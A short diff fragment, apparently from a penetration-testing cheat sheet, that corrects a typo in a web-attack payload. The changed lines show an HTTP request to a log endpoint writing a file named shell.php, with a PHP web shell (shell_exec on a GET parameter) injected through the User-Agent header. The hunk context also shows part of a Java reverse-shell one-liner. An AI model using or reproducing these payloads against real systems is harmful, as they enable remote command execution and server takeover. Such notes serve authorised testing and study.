@@ -38,4 +38,4 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 #Burpsuite to capture traffic
 POST /log/log.php?filename=shell.php&username=harvey HTTP/1.1
 Host: domain.com
-User-Agent: <?php echo shell_exec($_GET['e'].' 2>£1'); ?>
+User-Agent: <?php echo shell_exec($_GET['e'].' 2>&1'); ?>
